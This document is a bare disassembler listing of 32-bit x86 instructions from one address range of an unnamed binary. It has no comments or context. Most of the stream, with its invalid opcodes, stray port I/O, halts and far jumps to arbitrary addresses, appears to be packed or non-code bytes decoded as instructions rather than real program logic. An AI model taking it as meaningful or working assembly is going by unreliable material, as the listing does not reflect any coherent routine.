  41f36b:	fidivr DWORD PTR [esi+0x795d40b7]
  41f371:	adc    eax,0x5a620034
  41f376:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f377:	test   DWORD PTR [ebx-0x5fd78cf9],eax
  41f37d:	cmp    ebx,0x4fc1c3a5
  41f383:	ret    0x21ef
  41f386:	jb     0x41f374
  41f388:	les    ebx,FWORD PTR [edi-0x5f]
  41f38b:	test   eax,0xc4664404
  41f390:	xchg   DWORD PTR ds:0x689d35f3,ecx
  41f396:	aam    0x10
  41f398:	jno    0x41f37f
  41f39a:	jns    0x41f364
  41f39c:	mov    ecx,0xb7393cb0
  41f3a1:	js     0x41f41b
  41f3a3:	inc    ebp
  41f3a4:	and    bh,dh
  41f3a6:	shl    DWORD PTR [eax-0x32b61176],cl
  41f3ac:	aaa    
  41f3ad:	jnp    0x41f38a
  41f3af:	sub    eax,0x302e80e5
  41f3b4:	pop    esi
  41f3b5:	sub    DWORD PTR [edx],ebp
  41f3b7:	lock dec eax
  41f3b9:	pop    eax
  41f3ba:	cmp    eax,ebp
  41f3bc:	lock jnp 0x41f400
  41f3bf:	add    al,BYTE PTR [ebp-0x29]
  41f3c2:	mov    eax,ds:0x7b865efb
  41f3c7:	or     eax,0x491c43ae
  41f3cc:	dec    esp
  41f3cd:	je     0x41f3e2
  41f3cf:	push   eax
  41f3d0:	in     al,0x31
  41f3d2:	sub    eax,0xe40a81a8
  41f3d7:	shl    BYTE PTR [ebx],0xb4
  41f3da:	dec    esp
  41f3db:	add    eax,esp
  41f3dd:	cli    
  41f3de:	scas   al,BYTE PTR es:[edi]
  41f3df:	(bad)  
  41f3e0:	push   ebx
  41f3e1:	mov    ebp,0x8a2ef6e9
  41f3e6:	push   cs
  41f3e7:	sub    al,0x96
  41f3e9:	and    ah,BYTE PTR [edx+0x38263feb]
  41f3ef:	mov    al,ds:0x7d9febbf
  41f3f4:	jg     0x41f394
  41f3f6:	scas   eax,DWORD PTR es:[edi]
  41f3f7:	sbb    eax,0xac907d1
  41f3fc:	sti    
  41f3fd:	pop    esp
  41f3fe:	sbb    ebp,DWORD PTR [edi+ebp*4-0x2b38a1d5]
  41f405:	ror    edi,cl
  41f407:	sub    ebp,edi
  41f409:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f40a:	aas    
  41f40b:	or     eax,0x638b9411
  41f410:	call   0xa6307da9
  41f415:	mov    dh,0xae
  41f417:	mov    al,ds:0x6b8616eb
  41f41c:	fcomp  DWORD PTR [ebp+0x31]
  41f41f:	jl     0x41f3d6
  41f421:	addr16 jmp 0x41f488
  41f424:	fisub  DWORD PTR [ebp-0x78]
  41f427:	push   0xcf9ca122
  41f42c:	cs jmp 0x41f3d4
  41f42f:	das    
  41f430:	lea    esi,[ebx+0x6bcb2e63]
  41f436:	fadd   st,st(3)
  41f438:	mov    ch,0xc2
  41f43a:	mov    esi,ebp
  41f43c:	in     al,dx
  41f43d:	dec    edi
  41f43e:	mov    dh,ch
  41f440:	sbb    al,0x46
  41f442:	or     ebx,DWORD PTR [edx-0x20]
  41f445:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f446:	call   0xc3848dd9
  41f44b:	std    
  41f44c:	das    
  41f44d:	ret    
  41f44e:	cmc    
  41f44f:	and    eax,0x7353645d
  41f454:	adc    DWORD PTR [esi-0x2f47ec33],eax
  41f45a:	mov    ecx,0x441cef0
  41f45f:	xor    eax,0x1b0a0630
  41f464:	or     BYTE PTR [edx-0x510a87ac],cl
  41f46a:	jle    0x41f415
  41f46c:	imul   esp,ecx
  41f46f:	pop    ds
  41f470:	dec    ebx
  41f471:	cmp    eax,0x2e0accd8
  41f476:	and    eax,0x2a05641b
  41f47b:	nop
  41f47c:	or     DWORD PTR [edx+0x35],0xffffffec
  41f480:	pop    edi
  41f481:	inc    edi
  41f482:	xlat   BYTE PTR ds:[ebx]
  41f483:	mov    WORD PTR [ebp-0x5d45e137],gs
  41f489:	mov    dl,0xbb
  41f48b:	pop    es
  41f48c:	callw  0x89b7
  41f490:	(bad)  
  41f492:	mov    al,ds:0xbe19ba49
  41f497:	out    dx,eax
  41f498:	aas    
  41f499:	fwait
  41f49a:	mov    bl,0x97
  41f49c:	sti    
  41f49d:	sub    DWORD PTR [edx+0xc],esp
  41f4a0:	call   0x6b0caa3c
  41f4a5:	dec    eax
  41f4a6:	xchg   ebp,eax
  41f4a7:	rcl    BYTE PTR [ebp-0x41],0x19
  41f4ab:	dec    ebx
  41f4ac:	js     0x41f52b
  41f4ae:	cmp    bh,ch
  41f4b0:	outs   dx,DWORD PTR ds:[esi]
  41f4b1:	aam    0x8e
  41f4b3:	test   BYTE PTR [eax],0x60
  41f4b6:	inc    edx
  41f4b7:	or     eax,0x187ed182
  41f4bc:	push   0x41
  41f4be:	fsub   QWORD PTR [ecx]
  41f4c0:	add    BYTE PTR [ebx],0x81
  41f4c3:	mov    ss,esp
  41f4c5:	jmp    0xb412e348
  41f4ca:	in     eax,dx
  41f4cb:	jg     0x41f4b0
  41f4cd:	int3   
  41f4ce:	jg     0x41f4c9
  41f4d0:	or     DWORD PTR [edx+ebx*2+0xa],eax
  41f4d4:	loope  0x41f4b6
  41f4d6:	loope  0x41f546
  41f4d8:	xchg   edx,eax
  41f4d9:	push   0x73243af6
  41f4de:	dec    esp
  41f4df:	xor    BYTE PTR [ebp+eax*8+0x7fe6e59e],cl
  41f4e6:	sub    bl,0xee
  41f4e9:	pop    esi
  41f4ea:	inc    ebp
  41f4eb:	sub    ch,al
  41f4ed:	nop
  41f4ee:	add    DWORD PTR ds:[ecx],edi
  41f4f1:	mov    ds:0x7278023f,al
  41f4f6:	ins    DWORD PTR es:[edi],dx
  41f4f7:	adc    al,0xb3
  41f4f9:	inc    eax
  41f4fa:	pop    ecx
  41f4fb:	(bad)  
  41f4fd:	inc    esi
  41f4fe:	int3   
  41f4ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f500:	xor    BYTE PTR [ecx+edi*1],bh
  41f503:	pop    edx
  41f504:	xchg   edx,eax
  41f505:	xchg   esp,eax
  41f506:	xor    al,BYTE PTR [ecx]
  41f508:	jbe    0x41f578
  41f50a:	dec    ebx
  41f50b:	test   al,0x88
  41f50d:	nop
  41f50e:	or     BYTE PTR es:[edi],0xad
  41f512:	jb     0x41f509
  41f514:	bnd jae 0x41f4b8
  41f517:	js     0x41f4ea
  41f519:	inc    edx
  41f51a:	jnp    0x41f54b
  41f51c:	icebp  
  41f51d:	mov    ah,0x85
  41f51f:	xchg   esp,eax
  41f520:	or     DWORD PTR [edi+0x1e27008e],edx
  41f526:	jmp    0x41f53c
  41f528:	jae    0x41f586
  41f52a:	push   ss
  41f52b:	jmp    0x91bbf6fb
  41f530:	scas   eax,DWORD PTR es:[edi]
  41f531:	mov    ch,BYTE PTR [ebp-0x555714d0]
  41f537:	pop    esp
  41f538:	and    eax,0x5059b556
  41f53d:	and    bl,BYTE PTR [esi-0x6b125baa]
  41f543:	add    al,0x1a
  41f545:	(bad)  
  41f546:	xchg   DWORD PTR ss:[ebx-0x4c4144bd],ebp
  41f54d:	push   ss
  41f54e:	data16 jnp 0x41f5d0
  41f551:	dec    DWORD PTR [ecx+0x7a36e3d3]
  41f557:	mov    ds:0xc089bede,eax
  41f55c:	and    BYTE PTR [eax+0x5],0x53
  41f560:	xchg   esp,eax
  41f561:	or     eax,0x38020c4c
  41f566:	pop    es
  41f567:	jp     0x41f541
  41f569:	pop    esi
  41f56a:	pop    ss
  41f56b:	cmp    eax,0xbb1e1fb1
  41f570:	xchg   esp,eax
  41f571:	xchg   edi,eax
  41f572:	imul   ebx,DWORD PTR [esi],0xffffffbf
  41f575:	mov    ds:0x7bb08d7a,eax
  41f57a:	jle    0x41f59a
  41f57c:	cmp    eax,ebp
  41f57e:	pop    ss
  41f57f:	add    bl,BYTE PTR [ebx+edi*1+0x6d2fbe0e]
  41f586:	sbb    ch,dl
  41f588:	sbb    DWORD PTR ds:0x1b5402a4,0x57
  41f58f:	loopne 0x41f5e4
  41f591:	pop    ss
  41f592:	iret   
  41f593:	push   esi
  41f594:	imul   ebx,DWORD PTR [esi-0x37480948],0xa
  41f59b:	sub    eax,0x9c016f4f
  41f5a0:	mov    ds:0x449b9c3d,al
  41f5a5:	retf   0xecda
  41f5a8:	jae    0x41f5f8
  41f5aa:	ffree  st(6)
  41f5ac:	push   edx
  41f5ad:	fnstsw WORD PTR [esi+0xa]
  41f5b0:	xor    esi,0x7
  41f5b3:	or     al,0xd6
  41f5b5:	pop    esp
  41f5b6:	adc    BYTE PTR [ecx+0x7],bl
  41f5b9:	mov    esp,0xbb430225
  41f5be:	or     al,0x9b
  41f5c0:	loopne 0x41f556
  41f5c2:	mov    al,ds:0xff2f351e
  41f5c7:	sti    
  41f5c8:	and    dh,BYTE PTR [ecx*2-0x57bb4a9]
  41f5cf:	stos   BYTE PTR es:[edi],al
  41f5d0:	bound  edi,QWORD PTR [esi-0x29]
  41f5d3:	jne    0x41f5b5
  41f5d5:	aas    
  41f5d6:	sti    
  41f5d7:	imul   edi,eax,0xf964308a
  41f5dd:	pop    ecx
  41f5de:	mov    dl,0x8
  41f5e0:	and    DWORD PTR [edi+0x3d],0x5a
  41f5e4:	cmp    DWORD PTR ds:0x56985b3b,0xbdf9f38e
  41f5ee:	pop    esp
  41f5ef:	mov    ecx,0xb56e60ba
  41f5f4:	xchg   ecx,eax
  41f5f5:	push   0xba72afe0
  41f5fa:	ins    BYTE PTR es:[edi],dx
  41f5fb:	or     ecx,DWORD PTR [eax]
  41f5fd:	repnz pop ebx
  41f5ff:	push   eax
  41f600:	push   edi
  41f601:	jmp    0x41f66f
  41f603:	jae    0x41f5c3
  41f605:	xchg   BYTE PTR [ebx+edx*4-0x35],dl
  41f609:	inc    esp
  41f60a:	popa   
  41f60b:	mov    ah,0xdb
  41f60d:	es mov bh,0xd8
  41f610:	pop    ecx
  41f612:	in     eax,dx
  41f613:	sti    
  41f614:	mov    BYTE PTR [ebx-0x1129839c],ch
  41f61a:	jb     0x41f655
  41f61c:	ins    BYTE PTR es:[edi],dx
  41f61d:	sub    edi,DWORD PTR [edi+0x18]
  41f620:	push   ebp
  41f621:	pop    esi
  41f622:	mov    bl,0xe9
  41f624:	cdq    
  41f625:	dec    edi
  41f626:	ss pop ecx
  41f628:	push   es
  41f629:	inc    esp
  41f62a:	pop    ebx
  41f62b:	sbb    eax,0xdc1c2804
  41f630:	mov    WORD PTR [ecx+edx*1],gs
  41f633:	out    0xc0,al
  41f635:	not    dl
  41f637:	inc    eax
  41f638:	aaa    
  41f639:	(bad)  
  41f63a:	mov    ebp,0xc280cebc
  41f63f:	bound  ecx,QWORD PTR [edi+0x20]
  41f642:	bound  ebx,QWORD PTR [ecx]
  41f644:	push   0xffffffc2
  41f646:	shr    BYTE PTR [edi-0x69f8c55e],cl
  41f64c:	bound  eax,QWORD PTR [esi*4+0x5d9d111f]
  41f653:	inc    ebx
  41f654:	in     al,0xe0
  41f656:	and    ah,al
  41f658:	xor    DWORD PTR [eax-0x72e1b3cd],ebx
  41f65e:	dec    ecx
  41f65f:	popa   
  41f660:	lods   al,BYTE PTR ds:[esi]
  41f661:	mov    dl,0x98
  41f663:	(bad)
  41f667:	sbb    al,0x7
  41f669:	sbb    al,0x99
  41f66b:	stos   BYTE PTR es:[edi],al
  41f66c:	lods   eax,DWORD PTR ds:[esi]
  41f66d:	xchg   esi,eax
  41f66e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f66f:	or     BYTE PTR [edi-0x3a],ah
  41f672:	cdq    
  41f673:	or     esp,ecx
  41f675:	add    esp,ebx
  41f677:	std    
  41f678:	cvtps2pd xmm6,QWORD PTR [eax]
  41f67b:	pop    edi
  41f67c:	adc    eax,0xccfcea5b
  41f681:	xor    dh,BYTE PTR [eax+0x13]
  41f684:	fdiv   QWORD PTR [ebp+0x391b6a05]
  41f68a:	xor    eax,0x857d99f1
  41f68f:	xchg   ecx,eax
  41f690:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f691:	rdrand edi
  41f694:	jle    0x41f622
  41f696:	call   0x49f1:0x1113ef9b
  41f69d:	inc    ebp
  41f69e:	add    bh,BYTE PTR [esi-0x50]
  41f6a1:	pop    edi
  41f6a2:	pop    es
  41f6a3:	bnd jg 0x41f640
  41f6a6:	test   DWORD PTR ds:0xaeac5310,esp
  41f6ac:	shr    BYTE PTR [esi-0x233b3851],1
  41f6b2:	sub    al,0x90
  41f6b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6b5:	rol    BYTE PTR [ecx+ebp*4+0x2b],1
  41f6b9:	ins    DWORD PTR es:[edi],dx
  41f6ba:	repnz shl edx,cl
  41f6bd:	arpl   WORD PTR [ecx-0x670a8a3e],sp
  41f6c3:	push   es
  41f6c4:	(bad)  
  41f6c5:	jb     0x41f675
  41f6c7:	push   ebp
  41f6c8:	jge    0x41f72f
  41f6ca:	mov    al,BYTE PTR [ecx+ebx*2-0x16]
  41f6ce:	stc    
  41f6cf:	adc    eax,DWORD PTR [ecx+ebx*1+0x7535604]
  41f6d6:	fnstcw WORD PTR [ecx]
  41f6d8:	dec    edi
  41f6d9:	xor    DWORD PTR [ebx-0x67],ebp
  41f6dc:	test   bh,cl
  41f6de:	pop    ebx
  41f6df:	lds    ebp,FWORD PTR [ecx+0x5a0a6ef3]
  41f6e5:	dec    esi
  41f6e6:	push   esi
  41f6e7:	int3   
  41f6e8:	cdq    
  41f6e9:	and    edi,DWORD PTR [ecx+0x269d412c]
  41f6ef:	mov    dh,0xae
  41f6f1:	(bad)  
  41f6f2:	rcr    DWORD PTR [edi-0x26d17f48],cl
  41f6f8:	out    0x9a,eax
  41f6fa:	hlt    
  41f6fb:	sub    DWORD PTR [ebp-0x16bab922],edx
  41f701:	mov    edi,0xee68dc00
  41f706:	inc    edx
  41f707:	jne    0x41f70c
  41f709:	jno    0x41f74a
  41f70b:	das    
  41f70c:	(bad)  [ebx-0x1]
  41f70f:	(bad)  
  41f710:	loop   0x41f697
  41f712:	mov    ah,0xee
  41f714:	loop   0x41f732
  41f716:	sbb    ch,cl
  41f718:	call   0x7d7e:0x19017a60
  41f71f:	inc    ebx
  41f720:	sub    BYTE PTR [edx-0xc],ch
  41f723:	in     al,dx
  41f724:	lds    ebx,FWORD PTR [ecx+edi*4]
  41f727:	std    
  41f728:	inc    edx
  41f729:	leave  
  41f72a:	adc    dl,BYTE PTR [edi]
  41f72c:	in     eax,0x9f
  41f72e:	dec    ecx
  41f72f:	ins    DWORD PTR es:[edi],dx
  41f730:	mov    cl,0x84
  41f732:	leave  
  41f733:	mov    ds:0x8c462314,al
  41f738:	xchg   esi,eax
  41f739:	inc    ebx
  41f73a:	into   
  41f73b:	hlt    
  41f73c:	xlat   BYTE PTR ds:[ebx]
  41f73d:	cmp    eax,DWORD PTR [ecx]
  41f73f:	pop    ebp
  41f740:	jl     0x41f7b6
  41f742:	pushf  
  41f743:	or     edx,edx
  41f745:	push   0xffffffbf
  41f747:	pop    es
  41f748:	or     BYTE PTR [ebx],0xe9
  41f74b:	cwde   
  41f74c:	not    BYTE PTR [ebx]
  41f74e:	ret    0x6a49
  41f751:	push   eax
  41f752:	inc    eax
  41f753:	sbb    eax,0x7b06f232
  41f758:	and    eax,0x468e89fe
  41f75d:	fnstsw WORD PTR [edx+0x6ef7ef76]
  41f763:	(bad)  
  41f764:	in     al,0x68
  41f766:	dec    esp
  41f767:	int3   
  41f768:	xchg   edi,eax
  41f769:	pop    eax
  41f76a:	mov    ss,ebx
  41f76c:	cdq    
  41f76d:	imul   ecx,DWORD PTR [edx+eax*2],0xffffffc6
  41f771:	ret    0x5cb0
  41f774:	enter  0xa158,0xde
  41f778:	outs   dx,BYTE PTR ds:[esi]
  41f779:	jmp    0xc771:0xef9e1387
  41f780:	inc    edx
  41f781:	ret    0x7b20
  41f784:	and    BYTE PTR [edx+0x4a],dl
  41f787:	sahf   
  41f788:	(bad)  
  41f78a:	xchg   esi,eax
  41f78b:	mov    dl,0xd2
  41f78d:	add    DWORD PTR [ecx+ebp*4],ebp
  41f790:	call   0xcee1:0x20ae4228
  41f797:	inc    eax
  41f798:	add    al,0xb7
  41f79a:	xchg   ebp,eax
  41f79b:	ss push esi
  41f79d:	mov    al,ds:0xc372c95b
  41f7a2:	outs   dx,BYTE PTR ds:[esi]
  41f7a3:	cmp    ch,cl
  41f7a5:	push   ebx
  41f7a6:	js     0x41f7c9
  41f7a8:	or     al,dh
  41f7aa:	nop
  41f7ab:	mov    eax,0x9be243b7
  41f7b0:	pusha  
  41f7b1:	lods   eax,DWORD PTR ds:[esi]
  41f7b2:	stos   DWORD PTR es:[edi],eax
  41f7b3:	pop    esp
  41f7b4:	jecxz  0x41f73a
  41f7b6:	jns    0x41f791
  41f7b8:	je     0x41f7d8
  41f7ba:	sti    
  41f7bb:	cmp    BYTE PTR [eax+0x70],ch
  41f7be:	pop    ss
  41f7bf:	or     ebp,DWORD PTR [esi]
  41f7c1:	push   ecx
  41f7c2:	mov    eax,0x1eedb726
  41f7c7:	add    edx,DWORD PTR [edi]
  41f7c9:	leave  
  41f7ca:	arpl   dx,sp
  41f7cc:	inc    edi
  41f7cd:	cmp    BYTE PTR [edx],dh
  41f7cf:	add    al,0x64
  41f7d1:	cdq    
  41f7d2:	mov    eax,DWORD PTR [edi-0x77d9c4cf]
  41f7d8:	pop    edi
  41f7d9:	test   BYTE PTR [edx],ah
  41f7db:	inc    esp
  41f7dc:	jne    0x41f7ad
  41f7de:	mov    al,ds:0xf6ef9097
  41f7e3:	ficom  WORD PTR [ebx+ebx*1]
  41f7e6:	push   ecx
  41f7e7:	shl    edx,0xfb
  41f7ea:	push   0x24
  41f7ec:	adc    ah,ah
  41f7ee:	jnp    0x41f7dd
  41f7f0:	sub    esi,DWORD PTR [edx+0xe]
  41f7f3:	inc    ecx
  41f7f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7f5:	add    DWORD PTR [edi-0x2b],edi
  41f7f8:	inc    edi
  41f7f9:	pop    ss
  41f7fa:	cdq    
  41f7fb:	pop    ebp
  41f7fc:	test   DWORD PTR [edi],0x5ec544f6
  41f802:	iret   
  41f803:	mov    ?,WORD PTR [ecx+ebp*1+0x76178ef0]
  41f80a:	xor    BYTE PTR [ebp+0x28],cl
  41f80d:	retf   
  41f80e:	pop    edx
  41f80f:	or     BYTE PTR [ecx+0x7a],ah
  41f812:	cmp    al,0x22
  41f814:	loop   0x41f822
  41f816:	in     al,dx
  41f817:	sub    al,0xb5
  41f819:	jl     0x41f883
  41f81b:	pusha  
  41f81c:	dec    esi
  41f81d:	jecxz  0x41f83c
  41f81f:	mov    al,0xd3
  41f821:	ss pop ecx
  41f823:	jmp    0xc822f0ee
  41f828:	inc    esp
  41f829:	push   ecx
  41f82a:	leave  
  41f82b:	sahf   
  41f82c:	jmp    0x41f7f0
  41f82e:	cld    
  41f82f:	and    cl,BYTE PTR [ebp-0x61]
  41f832:	xor    BYTE PTR [esi+0x5fe1e309],dh
  41f838:	mov    ch,0x8a
  41f83a:	add    DWORD PTR [edi+0x13],esp
  41f83d:	lods   al,BYTE PTR ds:[esi]
  41f83e:	push   edx
  41f83f:	jg     0x41f806
  41f841:	or     al,0x80
  41f843:	inc    esi
  41f844:	push   edi
  41f845:	xchg   DWORD PTR [ecx+0x5e619efd],edi
  41f84b:	jmp    0x5abccc65
  41f850:	lahf   
  41f851:	loope  0x41f7e4
  41f853:	cwde   
  41f854:	in     al,0x71
  41f856:	dec    ebx
  41f857:	sub    esp,DWORD PTR [edx-0x7342bdeb]
  41f85d:	inc    ebp
  41f85e:	vmptrst QWORD PTR [ebp+0x26ad8a70]
  41f865:	mov    ecx,0x996a9c25
  41f86a:	dec    esp
  41f86b:	jns    0x41f88d
  41f86d:	dec    ebx
  41f86e:	and    DWORD PTR [esi-0xa],eax
  41f871:	(bad)  [ebp-0x1c221950]
  41f877:	or     ebx,ecx
  41f879:	xchg   ebp,eax
  41f87a:	push   ebp
  41f87b:	scas   al,BYTE PTR es:[edi]
  41f87c:	adc    eax,0xc23ead36
  41f881:	sahf   
  41f882:	pop    eax
  41f883:	cmp    ch,0xb5
  41f886:	mov    ah,0x3a
  41f888:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f889:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f88a:	cmp    eax,0x506db2cd
  41f88f:	pop    ds
  41f890:	frstor [edx-0x56]
  41f893:	sbb    eax,0x576b3f61
  41f898:	and    DWORD PTR [ebx+0x19],eax
  41f89b:	jp     0x41f8a3
  41f89d:	fisubr DWORD PTR [edi+0x7]
  41f8a0:	cmp    ch,BYTE PTR [edx-0x4d]
  41f8a3:	push   ebx
  41f8a4:	push   esi
  41f8a5:	enter  0x98b7,0x20
  41f8a9:	xchg   dl,bh
  41f8ab:	lds    esp,FWORD PTR [ebx+0x2ea7c03d]
  41f8b1:	inc    eax
  41f8b2:	or     eax,0x3ca3ddef
  41f8b7:	push   ebx
  41f8b8:	cmp    DWORD PTR [edx+ebx*8-0x7058d74e],ecx
  41f8bf:	xchg   DWORD PTR [eax-0x6266374e],ebp
  41f8c5:	and    eax,0xb3a0e765
  41f8ca:	sbb    DWORD PTR ds:0x2f214fc0,ebp
  41f8d0:	lds    ebp,FWORD PTR [ebx]
  41f8d2:	sahf   
  41f8d3:	inc    ecx
  41f8d4:	mov    esp,0x9a40fc3f
  41f8d9:	push   ecx
  41f8da:	jp     0x41f86f
  41f8dc:	add    DWORD PTR [esi-0x7de06dc2],ecx
  41f8e2:	pop    ds
  41f8e3:	mov    ds:0x9cda9fdb,al
  41f8e8:	jno    0x41f957
  41f8ea:	sbb    eax,DWORD PTR ds:0x76714626
  41f8f0:	int3   
  41f8f1:	ins    BYTE PTR es:[edi],dx
  41f8f2:	out    dx,eax
  41f8f3:	stos   DWORD PTR es:[edi],eax
  41f8f4:	dec    edi
  41f8f5:	arpl   WORD PTR [esi],sp
  41f8f7:	adc    BYTE PTR [ecx-0xd],bh
  41f8fa:	test   eax,0x156af492
  41f8ff:	cld    
  41f900:	popa   
  41f901:	ret    0x78a2
  41f904:	mov    al,0x30
  41f906:	icebp  
  41f907:	mov    edi,0x65710836
  41f90c:	mov    al,ds:0x354dd9a5
  41f911:	fs jno 0x41f94e
  41f914:	jbe    0x41f8a7
  41f916:	mov    esi,0x742b21c
  41f91b:	shl    DWORD PTR ds:0xec60bbe,1
  41f921:	sbb    DWORD PTR [ecx-0x7b10fb3d],eax
  41f927:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f928:	xchg   edx,eax
  41f929:	sub    al,0x73
  41f92b:	jmp    0x41f95f
  41f92d:	push   es
  41f92e:	jbe    0x41f983
  41f930:	push   esi
  41f931:	js     0x41f919
  41f933:	mov    dh,0xfa
  41f935:	test   eax,0x97d2cef2
  41f93a:	leave  
  41f93b:	std    
  41f93c:	loop   0x41f8c9
  41f93e:	jmp    DWORD PTR [ebx-0x16]
  41f941:	bound  eax,QWORD PTR [eax+ebx*4-0x6bdea165]
  41f948:	mov    esi,0x2e4dce99
  41f94d:	into   
  41f94e:	add    eax,0x47b04a11
  41f953:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f954:	mov    eax,DWORD PTR [ebx+0x76bdeefc]
  41f95a:	retf   0x6a2c
  41f95d:	mov    ch,0x48
  41f95f:	jno    0x41f9b7
  41f961:	scas   al,BYTE PTR es:[edi]
  41f962:	xor    BYTE PTR [ebp+0x56],dl
  41f965:	add    al,0x65
  41f967:	xor    eax,0x1808ee61
  41f96c:	mov    ecx,0xb03aae31
  41f971:	ret    
  41f972:	pop    ds
  41f973:	in     eax,dx
  41f974:	inc    edi
  41f975:	mov    ch,0xc8
  41f977:	(bad)  
  41f978:	sbb    eax,0xabc121f7
  41f97d:	lds    esp,FWORD PTR [ebx]
  41f97f:	dec    edi
  41f980:	sbb    ch,BYTE PTR ds:0x25404cb6
  41f986:	repnz mov WORD PTR [edx],?
  41f989:	aad    0x84
  41f98b:	int    0xed
  41f98d:	icebp  
  41f98e:	call   0x27fe7e95
  41f993:	out    dx,al
  41f994:	out    0x9e,eax
  41f996:	mov    ah,0x73
  41f998:	or     al,0xb6
  41f99a:	sub    eax,0xd7003dba
  41f99f:	ja     0x41f9dc
  41f9a1:	int3   
  41f9a2:	and    eax,0xca2bcd6b
  41f9a7:	stos   DWORD PTR es:[edi],eax
  41f9a8:	shl    DWORD PTR [eax+0x5cfabc2c],1
  41f9ae:	cld    
  41f9af:	add    DWORD PTR ds:0x8bec6369,eax
  41f9b5:	mov    ebx,0x3e7135c3
  41f9ba:	mov    eax,0x4acc293b
  41f9bf:	jle    0x41f98f
  41f9c1:	or     DWORD PTR [ebp+0x7d1f892f],edx
  41f9c7:	push   eax
  41f9c8:	mov    gs,WORD PTR [ebp+eiz*4+0x7fda5c2a]
  41f9cf:	cmp    eax,DWORD PTR [ebx+edx*4]
  41f9d2:	jmp    0x5f65:0x208f8745
  41f9d9:	sahf   
  41f9da:	clc    
  41f9db:	mov    dl,0x71
  41f9dd:	int3   
  41f9de:	jmp    0xbd8eab2b
  41f9e3:	ss jnp 0x41f9bc
  41f9e6:	(bad)  
  41f9e7:	enter  0xa86a,0x6c
  41f9eb:	in     eax,dx
  41f9ec:	cmp    BYTE PTR [ebp+0x2261ecd1],al
  41f9f2:	jg     0x41fa34
  41f9f4:	cmp    al,0x1f
  41f9f6:	push   ss
  41f9f7:	push   edi
  41f9f8:	mov    ecx,0xce58f88b
  41f9fd:	pusha  
  41f9fe:	daa    
  41f9ff:	or     eax,0x73671f52
  41fa04:	jns    0x41fa64
  41fa06:	pop    esp
  41fa07:	xchg   esp,eax
  41fa08:	inc    esi
  41fa09:	gs out 0x9e,eax
  41fa0c:	mov    al,0x69
  41fa0e:	mov    WORD PTR [ebp+0x38],gs
  41fa11:	adc    esp,eax
  41fa13:	push   ds
  41fa14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa15:	cmp    DWORD PTR [ecx+0x4b],esp
  41fa18:	cli    
  41fa19:	jmp    0x41f9c7
  41fa1b:	dec    ebx
  41fa1c:	outs   dx,DWORD PTR ds:[esi]
  41fa1d:	pop    esi
  41fa1e:	xchg   dh,ch
  41fa20:	nop
  41fa21:	or     al,al
  41fa23:	add    eax,DWORD PTR [ebx-0x4c]
  41fa26:	xchg   edx,eax
  41fa27:	aad    0x61
  41fa29:	mov    DWORD PTR [esi],edi
  41fa2b:	mov    bl,0x53
  41fa2d:	fdiv   DWORD PTR [ebx+0x3f]
  41fa30:	pusha  
  41fa31:	daa    
  41fa32:	cmp    DWORD PTR [ecx+0x6b04de99],ecx
  41fa38:	xor    BYTE PTR [edi],dh
  41fa3a:	call   0x7c04:0xa75cf210
  41fa41:	dec    ebx
  41fa42:	dec    edi
  41fa43:	mov    esi,0xcd8efdf3
  41fa48:	push   edi
  41fa49:	loope  0x41f9e4
  41fa4b:	mov    edx,0xb7f93d7b
  41fa50:	adc    ebx,ebp
  41fa52:	or     al,0x22
  41fa54:	or     bl,0x6b
  41fa57:	je     0x41fac9
  41fa59:	sub    BYTE PTR [edx],dh
  41fa5b:	inc    eax
  41fa5c:	mul    DWORD PTR fs:[edx-0x672b91fc]
  41fa63:	or     al,0xcd
  41fa65:	xchg   esp,eax
  41fa66:	int3   
  41fa67:	(bad)  
  41fa69:	not    DWORD PTR [edx]
  41fa6b:	outs   dx,DWORD PTR ds:[esi]
  41fa6c:	mov    dh,0xf0
  41fa6e:	pop    edi
  41fa6f:	ret    0xfb95
  41fa72:	xor    eax,DWORD PTR [eax]
  41fa74:	lods   al,BYTE PTR ds:[esi]
  41fa75:	ds mov bl,0x93
  41fa78:	pop    ss
  41fa79:	sub    al,0xde
  41fa7b:	inc    ebp
  41fa7c:	loopne 0x41fa21
  41fa7e:	jl     0x41faf1
  41fa80:	dec    ecx
  41fa81:	push   ds
  41fa82:	mov    ch,0x28
  41fa84:	lds    ecx,FWORD PTR [esi+0x478491ef]
  41fa8a:	(bad)  
  41fa8b:	ror    DWORD PTR [esp+eax*1+0x3f78bd53],1
  41fa92:	shl    BYTE PTR [edx-0x45873eb3],cl
  41fa98:	addr16 mov ebp,0xbca9b088
  41fa9e:	iret   
  41fa9f:	loope  0x41faa1
  41faa1:	fisub  WORD PTR [ebx]
  41faa3:	push   ecx
  41faa4:	iret   
  41faa5:	push   cs
  41faa6:	dec    edx
  41faa7:	clc    
  41faa8:	and    ebx,DWORD PTR [ecx+0x2ff383b1]
  41faae:	pushf  
  41faaf:	dec    ebp
  41fab0:	stc    
  41fab1:	add    edx,DWORD PTR [ebx+0x12631764]
  41fab7:	data16 xor al,0xbd
  41faba:	cmc    
  41fabb:	fs adc esp,ebx
  41fabe:	add    eax,0x9c1b7296
  41fac3:	daa    
  41fac4:	cmp    ebp,0x4e
  41fac7:	ror    WORD PTR [ecx],0x4e
  41facb:	lods   eax,DWORD PTR ds:[esi]
  41facc:	inc    sp
  41face:	aam    0x44
  41fad0:	inc    esp
  41fad1:	fnstsw WORD PTR [edi+0x2d755a23]
  41fad7:	fstp   DWORD PTR [edi+0x533f3b3]
  41fadd:	loope  0x41fa80
  41fadf:	and    eax,0x2b2b00ff
  41fae4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fae5:	ret    
  41fae6:	lods   al,BYTE PTR ds:[esi]
  41fae7:	xchg   edx,eax
  41fae8:	je     0x41fb5a
  41faea:	push   esi
  41faeb:	cs test al,0x1
  41faee:	jae    0x41faee
  41faf0:	in     eax,0xf8
